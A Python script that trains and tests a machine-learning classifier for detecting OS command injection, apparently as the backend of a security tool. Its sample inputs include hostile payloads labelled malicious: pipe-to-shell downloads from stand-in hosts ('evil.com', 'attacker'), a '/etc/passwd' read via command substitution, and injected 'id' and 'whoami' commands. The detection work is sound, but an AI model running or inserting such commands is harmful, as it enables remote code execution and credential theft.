#!/usr/bin/env python3
"""
Train TF-IDF + Logistic Regression model on generated command injection dataset
"""
import pandas as pd
import joblib
from sklearn.model_selection import train_test_split
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline
from sklearn.metrics import classification_report, confusion_matrix, accuracy_score
from pathlib import Path

def train_model():
    print("=" * 70)
    print("Training TF-IDF + Logistic Regression Model")
    print("=" * 70)
    
    # Load dataset
    data_file = Path('data/generated_command_injection_dataset.csv')
    print(f"\n1. Loading dataset from {data_file}...")
    df = pd.read_csv(data_file)
    
    print(f"   ✓ Loaded {len(df)} samples")
    print(f"   ✓ Malicious: {(df['Label']==1).sum()}")
    print(f"   ✓ Benign: {(df['Label']==0).sum()}")
    
    # Split features and labels
    X = df['sentence']
    y = df['Label']
    
    # Train-test split
    print("\n2. Splitting dataset (80% train, 20% test)...")
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42, stratify=y
    )
    print(f"   ✓ Train: {len(X_train)} samples")
    print(f"   ✓ Test: {len(X_test)} samples")
    
    # Create pipeline with TF-IDF + Logistic Regression
    print("\n3. Creating TF-IDF + Logistic Regression pipeline...")
    pipeline = Pipeline([
        ('tfidf', TfidfVectorizer(
            max_features=5000,
            ngram_range=(2, 5),   # Character bigrams to 5-grams capture pipes/encodings well
            analyzer='char',      # Include punctuation at edges
            min_df=1,
            max_df=0.98,
            lowercase=True
        )),
        ('clf', LogisticRegression(
            max_iter=2000,
            class_weight='balanced',  # Handle class imbalance
            solver='liblinear',       # Robust for small datasets
            random_state=42
        ))
    ])
    print("   ✓ Pipeline created")
    
    # Train model
    print("\n4. Training model...")
    pipeline.fit(X_train, y_train)
    print("   ✓ Training complete")
    
    # Evaluate on test set
    print("\n5. Evaluating model on test set...")
    y_pred = pipeline.predict(X_test)
    accuracy = accuracy_score(y_test, y_pred)
    
    print(f"\n   Accuracy: {accuracy:.4f} ({accuracy*100:.2f}%)")
    
    print("\n   Classification Report:")
    print("   " + "-" * 60)
    report = classification_report(y_test, y_pred, target_names=['Benign', 'Malicious'])
    for line in report.split('\n'):
        print(f"   {line}")
    
    print("\n   Confusion Matrix:")
    print("   " + "-" * 60)
    cm = confusion_matrix(y_test, y_pred)
    print(f"   [[TN={cm[0][0]:3d}  FP={cm[0][1]:3d}]")
    print(f"    [FN={cm[1][0]:3d}  TP={cm[1][1]:3d}]]")
    print()
    print("   TN=True Negative, FP=False Positive")
    print("   FN=False Negative, TP=True Positive")
    
    # Save model
    model_dir = Path('models')
    model_dir.mkdir(exist_ok=True)
    model_file = model_dir / 'os_cmd_injection_pipeline.joblib'
    
    print(f"\n6. Saving model to {model_file}...")
    joblib.dump(pipeline, model_file)
    print("   ✓ Model saved")
    
    # Test on some examples
    print("\n7. Testing on sample inputs...")
    test_cases = [
        ("ls -la", 0),
        ("|id", 1),
        ("cat file.txt", 0),
        ("curl http://evil.com | bash", 1),
        ("grep pattern file", 0),
        (";whoami", 1),
        ("echo hello", 0),
        ("$(cat /etc/passwd)", 1),
        ("wget http://attacker/p.sh | sh", 1),
        ("python3 -V", 0),
    ]
    
    print("   " + "-" * 60)
    print(f"   {'Input':<35} {'Expected':<10} {'Predicted':<10} {'Result'}")
    print("   " + "-" * 60)
    
    for cmd, expected in test_cases:
        pred = pipeline.predict([cmd])[0]
        proba = pipeline.predict_proba([cmd])[0]
        # Map probability to class=1 explicitly
        classes = list(pipeline.named_steps['clf'].classes_)
        idx_mal = classes.index(1) if 1 in classes else (len(classes) - 1)
        confidence = proba[idx_mal]  # Probability of malicious
        
        result = "✓" if pred == expected else "✗"
        expected_label = "Malicious" if expected == 1 else "Benign"
        pred_label = "Malicious" if pred == 1 else "Benign"
        
        print(f"   {cmd:<35} {expected_label:<10} {pred_label:<10} {result} ({confidence:.2%})")
    
    print("\n" + "=" * 70)
    print("✅ Model training complete!")
    print("=" * 70)
    print(f"\nModel file: {model_file}")
    print(f"Accuracy: {accuracy*100:.2f}%")
    print("\nNext steps:")
    print("  1. Update ml_server_fixed.py to use this pipeline model")
    print("  2. Restart the ML backend server")
    print("  3. Test with the MCP bridge")

if __name__ == "__main__":
    train_model()
